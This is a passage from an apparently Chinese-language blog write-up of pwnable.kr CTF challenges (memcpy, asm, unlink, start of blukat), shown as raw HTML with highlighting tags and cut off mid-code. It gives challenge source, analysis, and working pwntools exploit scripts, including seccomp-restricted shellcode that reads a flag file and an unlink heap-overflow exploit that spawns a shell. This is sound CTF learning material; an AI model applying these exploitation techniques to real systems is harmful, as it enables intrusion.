class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><blockquote><p>把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0.</p><p>movntps m128,XMM<br>m128 &lt;== XMM 直接把XMM中的值送入m128，不经过cache,必须对齐16字节.</p></blockquote><p>注意到当 input &gt; 64 时，会调用 fast_memcpy 下的 movntps 指令，此时必须保证地址对齐</p><p>另外 malloc 通过 edx 值返回地址值</p><p>考虑到分配 chunk 时有固定 header，32 位下长度为 0x8 (priv_size + size)，所以每次input时，我们通过控制 padding 保证满足下列条件之一：</p><ul><li>(input + padding + len(header)) % 0x10 &gt; 0x8 这种情况会自动对齐至 0x10</li><li>(input + padding + len(header)) % 0x10 = 0x0</li></ul><p>推荐：<a href="https://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">Malloc碎碎念</a></p><p><strong>这里添加一下对齐前后的堆内容的对比图片</strong></p><h3 id="解题-16"><a href="#解题-16" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chunk_header <span class="token operator">=</span> <span class="token number">0x8</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9022</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">8</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> chunk_header    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] %d"</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"experiment!\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="18-asm"><a href="#18-asm" class="headerlink" title="18. asm"></a>18. asm</h2><h3 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>这道题主要涉及<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a></p><blockquote><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p></blockquote><p>通过此特性初始化SCMP_ACT_KILL限制了所有 syscall，后添加规则允许使用的仅为 open read write exit exit_group</p><p>我们需要做的便是：</p><ol><li>打开(open) flag 文件</li><li>读取(read) flag 文件</li><li>写(write) 文件内容写到标准输出(stdout)</li></ol><p>对入门不会生成 shellcode 的我，pwnlib 提供了 shellcraft，<strong>注意发送时需要调用 asm 方法编译汇编码</strong></p><hr><ul><li><a href="https://www.man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual </a></li><li><a href="https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux" target="_blank" rel="noopener">X86 Assembly/Interfacing with Linux</a></li></ul><p>从上面的资料可知文件句柄是通过 rax 返回的，所以我们直接从 rax 读取文件即可，但实际上linux文件句柄(fd)是从 3 开始增长的，因为我们第一个也只打开一个，所以必定是 3</p><h3 id="解题-17"><a href="#解题-17" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'DEBUG'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9026</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sc += shellcraft.read("rax", "rsp", 100)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>sc <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"rsp"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="19-unlink"><a href="#19-unlink" class="headerlink" title="19. unlink"></a>19. unlink</h2><h3 id="题目-18"><a href="#题目-18" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token punctuation">{</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>OBJ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token punctuation">{</span>    OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>    BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>    FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>    FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>    BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>    A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>    B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>    B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>    C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// heap overflow!</span>    <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// exploit this unlink!</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>首先先看了 double-free 的利用，即 unlink 的一种利用是通过劫持GOT表实现命令执行，但是题目中 Unlink 后没有跟其他函数的，所以无法利用</p><p>那么能否直接操控 main 返回地址来实现跳转到 shellcode 执行呢？看下 main 最后的汇编是怎么写的</p><pre class=" language-armasm"><code class="language-armasm">0x080485ff <+208>:    mov    ecx,DWORD PTR [ebp-0x4]0x08048602 <+211>:    leave  0x08048603 <+212>:    lea    esp,[ecx-0x4]0x08048606 <+215>:    ret </code></pre><p>翻译过来</p><pre class=" language-armsam"><code class="language-armsam">mov    ecx,[ebp-0x4]mov    esp,ebppop    ebplea    esp,[ecx-0x4]ret</code></pre><p>此时栈内分布</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15918589934469.jpg" alt="-w790"></p><p>我们无法直接控制 eip，那么能否通过控制 ebp -&gt; ecx -&gt; esp -&gt; eip 实现呢</p><p>我们首先关注到 unlink</p><pre class=" language-c"><code class="language-c">BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span></code></pre><p>如下：</p><pre class=" language-plain"><code class="language-plain">BK = *(P + 4)FD = *(P)FD -> bk = BK -> *(*(P)+4) = *(P + 4)BK -> fd = FD -> *(*(P+4)) = *(P)</code></pre><p>更直白的说</p><pre class=" language-plain"><code class="language-plain">*(*(P->fd) + 4) = *(P->bk) 将 fd 的值 +4 作为地址，其值为 bk 的值*(*(P->bk)) = *(P->fd) 将 bk 的值作为地址，其值为 fd 的值</code></pre><p>即我们通过控制 fd bk 可以获取到两次写内存的机会</p><ol><li>利用 BK -&gt; fd = FD，bk 控制地址，fd 控制值</li><li>利用 FD -&gt; bk = BK，fd 控制地址，bk 控制值</li></ol><p>其次把已知条件列出来</p><ul><li>eip = [esp]</li><li>esp = ecx - 0x4</li><li>ecx = [ebp - 0x4]</li></ul><p>再根据栈中内容，可得</p><ul><li>stack_A + 0x10 = ebp - 0x4</li></ul><p>由于我们可以通过 A-&gt;buf 进行 overflow，假设我们将func_shell放在buf前4个字节，同时我们把buf地址标记为 shellcode，那么就有</p><ul><li>[heap_A + 0x8] = [shellcode] = func_shell = eip</li><li>shellcode = esp = ecx - 0x4 =&gt; heap_A + 0x8 = ecx - 0x4</li></ul><p>我们的目标是通过控制 fd bk 进而控制栈内存储的 ecx，进而控制 esp eip，我们先选取<code>bk 地址 fd 值</code>的利用方式即<code>BK-&gt;fd=FD</code>，有</p><ul><li>[bk] = &amp;ecx</li><li>[fd] = ecx</li></ul><p>结合上面的条件，推得</p><ul><li>[bk] = ebp - 0x4 = stack_A + 0x10</li><li>[fd] = heap_A + 0xc</li></ul><p>以此设置布局如下：</p><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|   heap_A + 0xc  |  stack_A + 0x10 |+-----------------+-----------------+ </code></pre><hr><p>假如我们选择<code>fd 地址 bk 值</code>的方式<code>FD-&gt;bk=BK</code>，有</p><ul><li>[bk] = ecx</li><li>[fd] + 0x4 = &amp;ecx</li></ul><p>推得</p><ul><li>[bk] = heap_A + 0xc</li><li>[fd] = ebp - 0x4 - 0x4 = stack_A + 0x10 - 0x4 = stack_A + 0xc</li></ul><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|  stack_A + 0xc  |   heap_A + 0xc  |+-----------------+-----------------+ </code></pre><h3 id="解题-18"><a href="#解题-18" class="headerlink" title="解题"></a>解题</h3><p>做完题后再想了几遍构造原理，感觉通透了不少</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>is_remote <span class="token operator">=</span> <span class="token boolean">True</span>method <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 1 or 2</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/unlink/unlink"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/unlink"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is stack address leak: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is heap address leak: "</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"get shell!\n"</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x080484eb</span><span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">else</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"."</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="20-blukat"><a href="#20-blukat" class="headerlink" title="20. blukat"></a>20. blukat</h2><h3 id="题目-19"><a href="#题目-19" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token 